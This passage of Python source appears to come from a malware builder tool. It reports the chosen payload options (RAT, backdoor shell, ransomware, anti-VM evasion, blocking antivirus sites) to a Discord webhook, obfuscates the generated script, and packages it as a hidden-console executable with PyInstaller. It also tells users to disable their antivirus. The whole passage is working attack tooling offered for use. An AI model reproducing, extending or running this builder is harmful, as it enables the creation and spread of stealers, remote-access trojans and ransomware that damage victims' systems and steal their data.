                {"name": f"Screenshot:",             "value": f"""```{option_screenshot}```""",                "inline": True},
            ],
            'footer': {
                "text": "BLX | benzoXdev",
                "icon_url": avatar_creator,
                }
            }
        
        embed_malware = {
            'title': f'V1ru5 Created (M4lw4r3):',
            'color': color_webhook,
            "fields": [
                {"name": f"Block Key:",              "value": f"""```{option_block_key}```""",                 "inline": True},
                {"name": f"Block Mouse:",            "value": f"""```{option_block_mouse}```""",               "inline": True},
                {"name": f"Block Task Manager:",     "value": f"""```{option_block_task_manager}```""",        "inline": True},
                {"name": f"Block AV Website:",       "value": f"""```{option_block_website}```""",             "inline": True},
                {"name": f"Shutdown:",               "value": f"""```{option_shutdown}```""",                  "inline": True},
                {"name": f"Spam Open Program:",      "value": f"""```{option_spam_open_programs}```""",        "inline": True},
                {"name": f"Spam Create File:",       "value": f"""```{option_spam_create_files}```""",         "inline": True},
                {"name": f"Message Popup:",         "value": f"""```{option_message_popup}```""",                "inline": True},
                {"name": f"Launch At Startup:",      "value": f"""```{option_startup}```""",                   "inline": True},
                {"name": f"Restart Every 5min:",     "value": f"""```{option_restart}```""",                   "inline": True},
                {"name": f"Anti VM & Debug:",        "value": f"""```{option_anti_vm_and_debug}```""",         "inline": True},
                {"name": f"RAT:",                     "value": f"""```{option_rat}```""",                        "inline": True},
                {"name": f"Backdoor (Shell):",        "value": f"""```{option_backdoor}```""",                   "inline": True},
                {"name": f"Ransomware:",              "value": f"""```{option_ransomware}```""",                 "inline": True},
            ],
            'footer': {
                "text": "BLX | benzoXdev",
                "icon_url": avatar_creator,
                }
            }

        requests.post(webhook, data=json.dumps({'embeds': [embed_config],  'username': "BLX | benzoXdev", 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
        requests.post(webhook, data=json.dumps({'embeds': [embed_stealer], 'username': "BLX | benzoXdev", 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
        requests.post(webhook, data=json.dumps({'embeds': [embed_malware], 'username': "BLX | benzoXdev", 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
        
    def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
        if sys.platform.startswith("win"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python", "-m", "pip", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif sys.platform.startswith("linux"):
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "uninstall", "pathlib", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Upgrade pyinstaller.. {reset}")
            subprocess.run(["python3", "-m", "pip3", "install", "--upgrade", "pyinstaller"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Converting to executable..")

        try:
            script_path = os.path.abspath(file_python)
            working_directory = os.path.dirname(script_path)
            original_cwd = os.getcwd()
            os.chdir(working_directory)

            try:
                pyinstaller_cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--distpath", path_destination, "--noconsole", script_path]
                if icon_path:
                    pyinstaller_cmd.extend(["--icon", icon_path])

                result = subprocess.run(pyinstaller_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if result.returncode != 0:
                    err_msg = result.stderr or result.stdout or "Unknown error"
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + err_msg}")
                    Continue()
                    Reset()
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
            finally:
                os.chdir(original_cwd)

            try:
                print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
                shutil.rmtree(os.path.join(working_directory, "build"))
                os.remove(os.path.join(working_directory, f"{name_file}.spec"))
                os.remove(file_python)
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Temporary file removed.{reset}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Temporary file not removed: {white + str(e)}")
            
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error during conversion: {white + str(e)}")
            Continue()
            Reset()

    file_python_relative = f'1-Output\\VirusBuilder\\{name_file}.py'
    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")
    path_destination_relative = "1-Output\\VirusBuilder"
    os.makedirs(path_destination, exist_ok=True)
    file_python = os.path.join(path_destination, f"{name_file}.py")

    # File detected by the antivirus, but be aware that there is no backdoor
    from FileDetectedByAntivirus.BuilderOptions import *

    key_encryption, webhook_encrypted = Encryption(webhook)
    PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted)
    PythonIdentifierObfuscation(file_python)

    if file_type == "Exe File":
        if not os.path.exists(path_destination):
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, reinstall the tool and try again.")
            Continue()
            Reset()
        
        if os.path.exists(file_python):
            if not icon_path or icon_path == "None" or not os.path.exists(str(icon_path)):
                ConvertToExe(file_python, path_destination, name_file)
            else:
                ConvertToExe(file_python, path_destination, name_file, icon_path)
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} The python file created previously was deleted, please remove your anti virus and try again.")

    print(f"{BEFORE + current_time_hour() + AFTER} {ADD} The virus was created, it is found in: {white + path_destination_relative}")
    try: os.startfile(path_destination)
    except: pass
    try: SendWebhook(webhook)
    except: pass
    Continue()
    Reset()
except Exception as e: 
    Error(e)